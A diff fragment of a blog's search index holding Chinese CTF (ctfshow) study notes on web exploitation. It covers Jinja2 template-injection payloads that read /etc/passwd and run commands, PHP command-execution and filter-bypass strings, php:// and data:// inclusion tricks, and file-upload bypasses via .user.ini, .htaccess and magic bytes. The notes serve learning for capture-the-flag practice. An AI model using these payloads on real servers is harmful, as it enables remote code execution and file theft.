+<h4 id="2-文件操作-1"><a href="#2-文件操作-1" class="headerlink" title="2. 文件操作:"></a>2. 文件操作:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 遍历找到 catch_warnings 类，再调用 open 读文件</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">  &#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">    &#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;,&#x27;r&#x27;).read() &#125;&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="3-命令执行-1"><a href="#3-命令执行-1" class="headerlink" title="3. 命令执行:"></a>3. 命令执行:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 遍历找到 catch_warnings 类，再用 eval 调用 os.popen 执行命令</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">  &#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">    &#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;) &#125;&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"># 也可尝试 popen 直接调用（仅当 popen 未被删减）</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&quot;cat /flag&quot;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">#无下划线版</span><br><span class="line">&#123;&#123;(lipsum | attr(request.values.b)).os.popen(request.values.a).read()&#125;&#125;&amp;a=cat /flag&amp;b=__globals__</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="3-各种过滤"><a href="#3-各种过滤" class="headerlink" title="3.各种过滤:"></a>3.各种过滤:</h3><h4 id="1-绕过过滤"><a href="#1-绕过过滤" class="headerlink" title="1.绕过过滤:"></a>1.<code>&#123;%%&#125;</code>绕过过滤<code>&#123;&#123;&#125;&#125;</code>:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">尝试&#123;%%&#125;，想回显内容在外面加个print就行</span><br><span class="line">&#123;%print(&quot;&quot;.__class__)%&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-getitem-绕过-过滤："><a href="#2-getitem-绕过-过滤：" class="headerlink" title="2.getitem()绕过[]过滤："></a>2.getitem()绕过[]过滤：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getitem() 是python的一个魔术方法,对字典使用时,传入字符串,返回字典相应键所对应的值:当对列表使用时,传入整数返回列表对应索引的值。</span><br><span class="line">原本是[117]，中括号被ban就用</span><br><span class="line">__getitem__(117)代替[117]</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-request方法绕过引号："><a href="#3-request方法绕过引号：" class="headerlink" title="3.request方法绕过引号："></a>3.request方法绕过引号：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">request在flask中可以访问基于 HTTP 请求传递的所有信息，这里的request并非python的函数，而是在flask内部的函数。</span><br><span class="line">request.args.key  #获取get传入的key的值</span><br><span class="line">request.form.key  #获取post传入参数(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">reguest.values.key  #获取所有参数，如果get和post有同一个参数，post的参数会覆盖get</span><br><span class="line">request.cookies.key  #获取cookies传入参数</span><br><span class="line">request.headers.key  #获取请求头请求参数</span><br><span class="line">request.data  #获取post传入参数(Content-Type:a/b)</span><br><span class="line">request.json  #获取post传入json参数 (Content-Type: application/json)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>web学习</category>
+      </categories>
+      <tags>
+        <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>文件包含</title>
     <url>/2025/06/02/ctfshow/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
     <content><![CDATA[<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="包含函数"><a href="#包含函数" class="headerlink" title="包含函数"></a>包含函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">- <span class="keyword">include</span>：找不到被包含的文件时只会产生警告，脚本将继续执行。</span><br><span class="line">- <span class="keyword">include_once</span>：和<span class="keyword">include</span>()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</span><br><span class="line">- <span class="keyword">require</span>：找不到被包含的文件时会产生致命错误，并停止脚本。</span><br><span class="line">- <span class="keyword">require_once</span>：和<span class="keyword">require</span>()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</span><br><span class="line">- <span class="title function_ invoke__">filter</span>():也可以包含伪协议</span><br></pre></td></tr></table></figure>
@@ -3715,144 +3735,6 @@
       <tags>
         <tag>语言学习</tag>
         <tag>linxu命令</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件上传</title>
-    <url>/2025/06/02/ctfshow/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
-    <content><![CDATA[<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="1-user-ini的使用"><a href="#1-user-ini的使用" class="headerlink" title="1. .user.ini的使用:"></a>1. .user.ini的使用:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">原理: 指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：<span class="keyword">require</span>(./a.jpg);这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有<span class="keyword">exit</span>()时该设置无效）所以要求当前目录必须要有php文件,巧合的是这题upload目录下有个index.php所以这种方式是可以成功的。</span><br><span class="line">    --必须在upload目录下有index.php这样才成功，没有可以尝试上传一个</span><br><span class="line">                                       --auto_append_file在木马文件上传后上传</span><br><span class="line">                                       --auto_prepend_file在木马文件上传前上传</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-绕过内容里不能包含php"><a href="#2-绕过内容里不能包含php" class="headerlink" title="2.绕过内容里不能包含php:"></a>2.绕过内容里不能包含php:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. 条件：short_open_tags=on</span><br><span class="line"><span class="meta">&lt;?</span> xxx <span class="meta">?&gt;</span></span><br><span class="line"><span class="number">2</span>. 无条件</span><br><span class="line"><span class="meta">&lt;?=</span> xxx <span class="meta">?&gt;</span></span><br><span class="line"><span class="number">3</span>. 条件： 开启配置参数asp_tags=on 且php版本 &lt; <span class="number">7.0</span> </span><br><span class="line">&lt;% xxx %&gt;</span><br><span class="line"><span class="number">4</span>. 条件：php版本 &lt; <span class="number">7.0</span></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;xxx&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-增加文件头"><a href="#3-增加文件头" class="headerlink" title="3.增加文件头:"></a>3.增加文件头:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89A    ---是GIF图像格式的一种版本标识</span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>文件类型</th>
-<th>魔术头（十六进制）</th>
-<th>魔术头（ASCII）</th>
-<th>示例用途</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>GIF89a</strong></td>
-<td><code>47 49 46 38 39 61</code></td>
-<td><code>GIF89a</code></td>
-<td>正规 GIF 图</td>
-</tr>
-<tr>
-<td><strong>GIF87a</strong></td>
-<td><code>47 49 46 38 37 61</code></td>
-<td><code>GIF87a</code></td>
-<td>老版本 GIF 图</td>
-</tr>
-<tr>
-<td><strong>PNG</strong></td>
-<td><code>89 50 4E 47 0D 0A 1A 0A</code></td>
-<td><code>.PNG....</code></td>
-<td>PNG 图</td>
-</tr>
-<tr>
-<td><strong>JPG</strong> &#x2F; JPEG</td>
-<td><code>FF D8 FF</code></td>
-<td>N&#x2F;A</td>
-<td>开头是 <code>FFD8FF</code>，结尾是 <code>FFD9</code></td>
-</tr>
-<tr>
-<td><strong>PDF</strong></td>
-<td><code>25 50 44 46 2D</code></td>
-<td><code>%PDF-</code></td>
-<td>经典文档上传绕过</td>
-</tr>
-<tr>
-<td><strong>ZIP</strong></td>
-<td><code>50 4B 03 04</code></td>
-<td><code>PK..</code></td>
-<td>上传压缩包</td>
-</tr>
-<tr>
-<td><strong>RAR</strong></td>
-<td><code>52 61 72 21 1A 07 00</code></td>
-<td><code>Rar!...</code></td>
-<td>压缩文件</td>
-</tr>
-<tr>
-<td><strong>EXE</strong>（Windows）</td>
-<td><code>4D 5A</code></td>
-<td><code>MZ</code></td>
-<td>可执行文件</td>
-</tr>
-<tr>
-<td><strong>ELF</strong>（Linux）</td>
-<td><code>7F 45 4C 46</code></td>
-<td><code>.ELF</code></td>
-<td>Linux 二进制</td>
-</tr>
-<tr>
-<td><strong>MP3</strong></td>
-<td><code>49 44 33</code></td>
-<td><code>ID3</code></td>
-<td>音频文件头</td>
-</tr>
-<tr>
-<td><strong>DOCX &#x2F; XLSX &#x2F; PPTX</strong></td>
-<td><code>50 4B 03 04</code></td>
-<td>ZIP！</td>
-<td>Office 新版其实是 ZIP 容器</td>
-</tr>
-<tr>
-<td><strong>OLD DOC (97-2003)</strong></td>
-<td><code>D0 CF 11 E0 A1 B1 1A E1</code></td>
-<td>N&#x2F;A</td>
-<td>老式 Office 文件</td>
-</tr>
-</tbody></table>
-<h3 id="4-远程包含"><a href="#4-远程包含" class="headerlink" title="4.远程包含:"></a>4.远程包含:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在服务器上可以通过ip转数字，让他访问木马脚本网站，并执行</span><br><span class="line">    <span class="number">139.224</span>.<span class="number">54.229</span>====<span class="number">2346727141</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="5-通过jpg-gif-png二次渲染"><a href="#5-通过jpg-gif-png二次渲染" class="headerlink" title="5.通过jpg.gif.png二次渲染;"></a>5.通过jpg.gif.png二次渲染;</h3><h4 id="1-是否存在二次渲染"><a href="#1-是否存在二次渲染" class="headerlink" title="1.是否存在二次渲染:"></a>1.是否存在二次渲染:</h4><table>
-<thead>
-<tr>
-<th>条件</th>
-<th>说明</th>
-<th>判断方法</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>上传后图像被重新压缩</td>
-<td>MD5不一致</td>
-<td>上传后下载图片对比</td>
-</tr>
-<tr>
-<td>上传的 EXIF 信息被清除</td>
-<td>文件属性被抹掉</td>
-<td><code>exif_read_data()</code> 检查</td>
-</tr>
-<tr>
-<td>伪代码失效</td>
-<td>木马内容被去掉</td>
-<td><code>&lt;?php ... ?&gt;</code> 被清空</td>
-</tr>
-<tr>
-<td>文件大小被大幅缩小</td>
-<td>说明被重新处理</td>
-<td>查看上传前后大小差距</td>
-</tr>
-<tr>
-<td>Webshell 不再执行</td>
-<td>二次渲染清除了恶意代码</td>
-<td>手动访问判断是否能执行PHP代码</td>
-</tr>
-</tbody></table>
-<h3 id="6-通过-htaccess包含"><a href="#6-通过-htaccess包含" class="headerlink" title="6.通过.htaccess包含:"></a>6.通过.htaccess包含:</h3><p>httpd,httpd是apache的服务，关于apache的文件上传中有一个.htaccess配置文件，可以进行文件包含</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">文件为.htaccess</span><br><span class="line">    内容:</span><br><span class="line"></span><br><span class="line">    &lt;FilesMatch <span class="string">&quot;\.jpg&quot;</span>&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>web学习</category>
-      </categories>
-      <tags>
-        <tag>ctfshow</tag>
       </tags>
   </entry>
   <entry>
@@ -4730,6 +4612,124 @@
       <tags>
         <tag>语言学习</tag>
         <tag>golang</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>命令执行</title>
+    <url>/2025/06/02/ctfshow/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
+    <content><![CDATA[<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat f*&#x27;</span>);              --通过*通配符来绕过检测</span><br><span class="line">         也可以用cat f???</span><br><span class="line">?c=<span class="keyword">echo</span> `ls`;                     --在Shell 脚本或命令行中，反引号` ` 和 $() 用于执行命令并获取其输出。</span><br><span class="line">            --反引号 是“shell 执行操作符” —— 类似于<span class="title function_ invoke__">shell_exec</span>()`</span><br><span class="line">?c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac flag.php&#x27;</span>);        --<span class="keyword">eval</span>() 会把传入的字符串当成PHP代码执行。</span><br><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php      --include期望一个字符串形式的文件名或路径。</span></span><br><span class="line">c=data:<span class="comment">//text/plain,&lt;?php system(&quot;cat f*&quot;)?&gt;            --将输入的作为代码执行</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-思考："><a href="#1-思考：" class="headerlink" title="1.思考："></a>1.思考：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">通过ls -ld .来查看该目录的权限</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;touch 1.php&#x27;</span>);           --通过touch创建一个文件</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo &quot;content&quot; | cat &gt;&gt; 1.php&#x27;</span>);    --通过cat重定向将输入内容写入文件，但是不能理解为什么如果写入内容是一句话木马就写入不了     ---字符转义 一句话马里面的字符会转义 或者闭合，先编码在写入，关键是单引号的转义</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>ls -ld .:</p>
+<p><img src="C:\Users\wanyan\AppData\Roaming\Typora\typora-user-images\image-20250331210855166.png" alt="image-20250331210855166"></p>
+<h3 id="一些绕过"><a href="#一些绕过" class="headerlink" title="一些绕过"></a>一些绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">空格的绕过可以使用%<span class="number">0</span>a代替     --%<span class="number">0</span>a换行符</span><br><span class="line">分号可以用<span class="meta">?&gt;</span>代替</span><br><span class="line">小数点可以用<span class="title function_ invoke__">localeconv</span>()     --函数返回小数点</span><br><span class="line">php中<span class="keyword">include</span>是可以不带括号的函数 ----过滤括号时使用</span><br><span class="line">空格(%<span class="number">20</span>)、制表符(%<span class="number">09</span>)、换行符(%<span class="number">0</span>a)、回车符(%<span class="number">0</span>d)、空字节符(%<span class="number">00</span>)、垂直制表符（%<span class="number">0</span>b），换页符（%<span class="number">0</span>c）</span><br></pre></td></tr></table></figure>
+
+<h4 id="对空格的绕过"><a href="#对空格的绕过" class="headerlink" title="对空格的绕过"></a>对空格的绕过</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$&#123;IFS&#125; 但不能写作 <span class="variable">$IFS</span>       --在 Linux/Bash 中内部字段分隔符，<span class="variable">$IFS</span>默认是空格、Tab、换行。空格可以被 $&#123;IFS&#125; 替代</span><br><span class="line">$IFS$<span class="number">9</span>                 --内部字段分隔符（第一个字符是空格） 第 <span class="number">9</span> 个位置参数（通常为空）</span><br><span class="line">%<span class="number">09</span>                   --URL 编码的 Tab 字符</span><br><span class="line">&lt;&gt;                 </span><br><span class="line">&lt;                      --输入重定向，例如 cat &lt; flag</span><br><span class="line"><span class="variable">$IFS</span>%<span class="number">09</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p>php支持的伪协议：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> file:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line"><span class="number">2</span> http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line">  glob:<span class="comment">//* 是一个 伪协议    ----可以用来绕过open_basedir用于通过 fopen()、file_get_contents() 等函数读取匹配文件的内容</span></span><br><span class="line"><span class="number">3</span> ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line"><span class="number">4</span> php:<span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line"><span class="number">5</span> zlib:<span class="comment">// — 压缩流</span></span><br><span class="line"><span class="number">6</span> data:<span class="comment">// — 数据（RFC 2397）       </span></span><br><span class="line"><span class="number">7</span> glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line"><span class="number">8</span> phar:<span class="comment">// — PHP 归档</span></span><br><span class="line"><span class="number">9</span> ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line"><span class="number">10</span> rar:<span class="comment">// — RAR</span></span><br><span class="line"><span class="number">11</span> ogg:<span class="comment">// — 音频流</span></span><br><span class="line"><span class="number">12</span> expect:<span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="1-flie"><a href="#1-flie" class="headerlink" title="1.flie:&#x2F;&#x2F;"></a>1.flie:&#x2F;&#x2F;</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。</span></span><br><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php      --convert.base64-encode，就是一种过滤器</span></span><br><span class="line">php:<span class="comment">//filter/resource=index.php       --没有base64编码，源码可能无法显示(部分字符被浏览器解析)</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="2-data"><a href="#2-data" class="headerlink" title="2.data:&#x2F;&#x2F;"></a>2.data:&#x2F;&#x2F;</h4><p>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/plain,&lt;?php phpinfo();?&gt;   </span></span><br><span class="line">如果要使用:data:<span class="comment">//必须打开    --but这两个是默认关闭</span></span><br><span class="line">allow_url_include=On</span><br><span class="line">allow_url_fopen=On</span><br></pre></td></tr></table></figure>
+
+<h4 id="flie-与data-的区别（include-‘xxx’-include-“xxx”-）"><a href="#flie-与data-的区别（include-‘xxx’-include-“xxx”-）" class="headerlink" title="flie:&#x2F;&#x2F;与data&#x2F;&#x2F;的区别（include ‘xxx’; include(“xxx”);）"></a>flie:&#x2F;&#x2F;与data&#x2F;&#x2F;的区别（include ‘xxx’; include(“xxx”);）</h4><p><img src="C:\Users\wanyan\AppData\Roaming\Typora\typora-user-images\image-20250401164926563.png" alt="image-20250401164926563"></p>
+<h2 id="使用函数拿到flag"><a href="#使用函数拿到flag" class="headerlink" title="使用函数拿到flag"></a>使用函数拿到flag</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">getallheaders</span>()：返回所有的HTTP头信息，返回的是数组而<span class="keyword">eval</span>要求为字符串，所以要用<span class="title function_ invoke__">implode</span>()函数将数组转换为字符串</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">get_defined_vars</span>()：该函数的作用是获取所有的已定义变量，返回值也是数组，不过是二维数组，用<span class="title function_ invoke__">var_dump</span>()输出可以看见输出的内容，看见在第几位之后，可以用<span class="title function_ invoke__">current</span>()函数来获取其值，详细可以看官方函数。</span><br><span class="line">payload：<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>()));</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_id</span>()：<span class="title function_ invoke__">session_id</span>()可以用来获取/设置当前会话 ID，可以用这个函数来获取cookie中的phpsessionid，并且这个值我们是可控的。</span><br><span class="line">    如可以在cookie中设置 PHPSESSID=<span class="number">706870696e666</span>f28293b，然后用<span class="title function_ invoke__">hex2bin</span>()函数，</span><br><span class="line">    即传入?exp=<span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>())));     </span><br><span class="line">    并设置cookie：PHPSESSID=<span class="number">706870696e666</span>f28293b</span><br><span class="line">    session_start 函数是为了开启session</span><br><span class="line">    </span><br><span class="line">配合使用的函数：</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(‘.’)); 查看当前目录下的所有文件名</span><br><span class="line">  <span class="title function_ invoke__">var_dump</span>()</span><br><span class="line">	<span class="title function_ invoke__">localeconv</span>() 函数返回一包含本地数字及货币格式信息的数组。   --第一个值为小数点.</span><br><span class="line">	<span class="title function_ invoke__">current</span>() 函数返回数组中的当前元素（单元）,默认取第一个值，pos是current的别名</span><br><span class="line">	<span class="title function_ invoke__">each</span>() 返回数组中当前的键/值对并将数组指针向前移动一步</span><br><span class="line">	<span class="title function_ invoke__">end</span>() 将数组的内部指针指向最后一个单元</span><br><span class="line">	<span class="title function_ invoke__">next</span>() 将数组中的内部指针向前移动一位</span><br><span class="line">	<span class="title function_ invoke__">prev</span>() 将数组中的内部指针倒回一位</span><br><span class="line">	<span class="title function_ invoke__">array_reverse</span>() 以相反的元素顺序返回数组</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="使用函数getallheaders-："><a href="#使用函数getallheaders-：" class="headerlink" title="使用函数getallheaders()："></a>使用函数getallheaders()：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">getallheaders</span>()));构造这个，问题是如果没有 <span class="keyword">eval</span>()，会被当做字符串，而不会被执行</span><br><span class="line">Zzzzzz:<span class="title function_ invoke__">system</span>(<span class="string">&#x27;nl flag.php&#x27;</span>);     ----配合这个使用</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="对使用-或运算得到答案"><a href="#对使用-或运算得到答案" class="headerlink" title="对使用| 或运算得到答案"></a>对使用| 或运算得到答案</h3><p>利用穷举脚本，来通过或运算获得我们想要的字符    —py</p>
+<h2 id="dev-null"><a href="#dev-null" class="headerlink" title="&#x2F;dev&#x2F;null"></a>&#x2F;dev&#x2F;null</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在类Unix系统中,/dev/<span class="literal">null</span>,或称空设备,是一个特殊的设备文件,它丢弃一切写入其中的数据(但报告写入操作成功)</span><br><span class="line"><span class="number">0</span>   标准输入</span><br><span class="line"><span class="number">1</span>   标准输出</span><br><span class="line"><span class="number">2</span>   错误输出</span><br><span class="line">    </span><br><span class="line"><span class="number">2</span>&gt;/dev/<span class="literal">null</span>   把错误输出到空设备（即丢弃）</span><br><span class="line">&gt;/dev/<span class="literal">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span>   相当于<span class="number">1</span>&gt;/dev/<span class="literal">null</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span>   即把标准输出丢弃，并且把错误输出输出到标准输出。合计起来就是错误和标准输出都输出到空设备</span><br><span class="line"><span class="number">2</span>&gt;&amp;<span class="number">1</span> &gt;/dev/<span class="literal">null</span>   错误输出到标准输出，即输出到屏幕上，而标准输出被丢弃</span><br><span class="line">something interesting: 重定向&gt; 和 &gt;&gt;   前者会先清空文件，然后再写入内容，后者会将重定向的内容追加到现有文件的尾部.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">思路一：%<span class="number">0</span>a截断</span><br><span class="line">也就是使两条语句不在一行上执行</span><br><span class="line">c=ls%<span class="number">0</span>a</span><br><span class="line">思路二：管道符的运用</span><br><span class="line">| 直接执行后面的语句</span><br><span class="line">|| 如果前面执行的语句出错，则执行后面的语句</span><br><span class="line">&amp; 如果前面的语句为假则直接执行后面的语句，前面的语句可真可假</span><br><span class="line">&amp;&amp; 如果前面的语句为假则直接出错，不执行后面的语句</span><br><span class="line">; 执行完前面的再执行后面的</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="使用命令路径"><a href="#使用命令路径" class="headerlink" title="使用命令路径"></a>使用命令路径</h2> <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">bin为<span class="keyword">binary</span>的简写，主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。</span><br><span class="line">我们日常直接使用的cat或者ls等等都其实是简写，例如ls完整全称应该是/bin/ls</span><br><span class="line">base64命令 Encode <span class="keyword">and</span> decode using Base64 representation</span><br><span class="line"></span><br><span class="line">c=/???/????<span class="number">64</span> ????.???      ---base64命令</span><br><span class="line">使用which +命令      ---输出全部的命令路径</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="source命令的使用"><a href="#source命令的使用" class="headerlink" title="source命令的使用"></a>source命令的使用</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">source命令：</span><br><span class="line">source命令也称为“点命令”，也就是一个点符号（.）。</span><br><span class="line">source命令通常用于重新执行刚修改的初始化文件，使之立即生效，而不必注销并重新登录。</span><br><span class="line">用法： </span><br><span class="line">source filename 或 . filename</span><br></pre></td></tr></table></figure>
+
+<h2 id="仅有-和-时"><a href="#仅有-和-时" class="headerlink" title="仅有$和()时:"></a>仅有$和()时:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$(()) 代表做一次运算，因为里面为空，也表示值为<span class="number">0</span></span><br><span class="line">$((~$(()))) 对<span class="number">0</span>作取反运算，值为-<span class="number">1</span></span><br><span class="line">$(($((~$(())))$((~$(()))))) -<span class="number">1</span>-<span class="number">1</span>，也就是(-<span class="number">1</span>)+(-<span class="number">1</span>)为-<span class="number">2</span>，所以值为-<span class="number">2</span></span><br><span class="line">$((~$(($((~$(())))$((~$(()))))))) 再对-<span class="number">2</span>做一次取反得到<span class="number">1</span>，所以值为<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;$((&quot;</span> + <span class="string">&quot;$((~$(())))&quot;</span> * <span class="number">37</span> + <span class="string">&quot;))&quot;</span></span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<h2 id="读取文件函数"><a href="#读取文件函数" class="headerlink" title="读取文件函数"></a>读取文件函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">常用读文件函数</span><br><span class="line">    --对读取文件时，必须指定目录,比如当前目录是./</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$filename</span>);    --字符串<span class="title function_ invoke__">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">php_strip_whitespace</span>(<span class="variable">$filename</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>));</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// file — 把整个文件读入一个数组中</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file</span>(<span class="variable">$filename</span>)); </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file</span>(<span class="variable">$filename</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$filename</span>); <span class="comment">// 非php代码</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$filename</span>); <span class="comment">// 非php代码</span></span><br><span class="line"><span class="keyword">require</span>(<span class="variable">$filename</span>); <span class="comment">// 非php代码</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="variable">$filename</span>); <span class="comment">// 非php代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// fopen去读取文件内容</span></span><br><span class="line"><span class="title function_ invoke__">fread</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>,<span class="string">&quot;r&quot;</span>), <span class="variable">$size</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fread</span>(<span class="title function_ invoke__">popen</span>(<span class="string">&quot;cat flag&quot;</span>, <span class="string">&quot;r&quot;</span>), <span class="variable">$size</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fgets</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>))); <span class="comment">// 读取一行</span></span><br><span class="line"><span class="title function_ invoke__">fpassthru</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;r&quot;</span>)); <span class="comment">// 从当前位置一直读取到 EOF</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">fgetcsv</span>(<span class="title function_ invoke__">fopen</span>(<span 